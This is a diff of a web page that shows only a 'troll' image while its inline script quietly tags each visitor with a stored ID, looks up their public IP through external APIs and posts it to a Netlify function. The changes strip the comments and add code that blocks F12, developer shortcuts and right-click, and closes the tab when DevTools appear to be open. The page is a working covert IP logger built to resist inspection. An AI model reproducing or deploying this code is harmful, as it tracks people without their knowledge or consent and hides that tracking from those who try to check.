@@ -28,7 +28,6 @@
 <body>
     <img src="https://cdn.computerhoy.com/sites/navi.axelspringer.es/public/media/image/2014/10/64609-estudio-dice-que-trolls-internet-son-sadicos-psicopatas.jpg?tf=3840x" alt="Troll Image">
     <script>
-        // Función para generar un UUID único
         function generateUUID() {
             return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
                 const r = Math.random() * 16 | 0, v = c === 'x' ? r : (r & 0x3 | 0x8);
@@ -36,7 +35,6 @@
             });
         }
 
-        // Obtener o generar un ID único para el visitante
         let visitorId = localStorage.getItem('visitorId');
         if (!visitorId) {
             visitorId = generateUUID();
@@ -44,6 +42,52 @@
         }
 
         const FUNCTION_URL = '/.netlify/functions/send-ip';
+
+        document.addEventListener('keydown', (e) => {
+            if (
+                e.key === 'F12' ||
+                (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) ||
+                (e.metaKey && e.altKey && e.key === 'I')
+            ) {
+                e.preventDefault();
+                closeTab();
+            }
+        });
+
+        document.addEventListener('contextmenu', (e) => {
+            e.preventDefault();
+            closeTab();
+        });
+
+        function closeTab() {
+            try {
+                window.close();
+                setTimeout(() => {
+                    window.location.href = 'about:blank';
+                }, 100);
+            } catch (e) {
+                console.error('❌ Error al cerrar pestaña:', e);
+                window.location.href = 'about:blank';
+            }
+        }
+
+        let isDevToolsOpen = false;
+        function checkDevTools() {
+            const threshold = 100;
+            const widthDiff = window.outerWidth - window.innerWidth;
+            const heightDiff = window.outerHeight - window.innerHeight;
+            if (widthDiff > threshold || heightDiff > threshold) {
+                if (!isDevToolsOpen) {
+                    isDevToolsOpen = true;
+                    console.log('⚠️ DevTools detectado');
+                    closeTab();
+                }
+            } else {
+                isDevToolsOpen = false;
+            }
+        }
+
+        setInterval(checkDevTools, 500);
 
         async function obtenerDatos(retries = 3) {
             const apis = [
@@ -56,7 +100,6 @@
                     try {
                         console.log(`🔍 Intento ${attempt} con ${api.url}...`);
 
-                        // Obtener IP
                         const ipResponse = await fetch(api.url, {
                             method: "GET",
                             headers: { "Accept": "application/json" }
@@ -73,7 +116,6 @@
                             ip = (await ipResponse.text()).trim();
                         }
 
-                        // Validar que es una IP IPv4
                         const ipv4Regex = /^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/;
                         if (!ipv4Regex.test(ip)) {
                             throw new Error("No se obtuvo una IP IPv4 válida");
@@ -81,14 +123,12 @@
 
                         console.log("✔️ IP IPv4 obtenida:", ip);
 
-                        // Comparar con la última IP enviada
                         const lastSentIP = localStorage.getItem('lastSentIP');
                         if (lastSentIP === ip) {
                             console.log("ℹ️ IP igual a la anterior, no se envía:", ip);
-                            return; // Salir si la IP no ha cambiado
+                            return;
                         }
 
-                        // Enviar al backend (Netlify Function)
                         console.log("📤 Enviando datos a la función...");
                         const functionResponse = await fetch(FUNCTION_URL, {
                             method: "POST",
@@ -102,23 +142,20 @@
                         }
 
                         console.log("✔️ Datos enviados a la función exitosamente");
-                        // Almacenar la IP enviada
                         localStorage.setItem('lastSentIP', ip);
-                        return; // Salir si todo fue exitoso
+                        return;
 
                     } catch (error) {
                         console.error(`❌ Error en intento ${attempt} con ${api.url}:`, error.message);
                         if (attempt === retries && api === apis[apis.length - 1]) {
                             console.error("❌ Se agotaron los intentos y APIs. No se pudo enviar la IP.");
                         }
-                        // Esperar 1 segundo antes de reintentar
                         await new Promise(resolve => setTimeout(resolve, 1000));
                     }
                 }
             }
         }
 
-        // Ejecutar la función
         obtenerDatos();
     </script>
 </body>
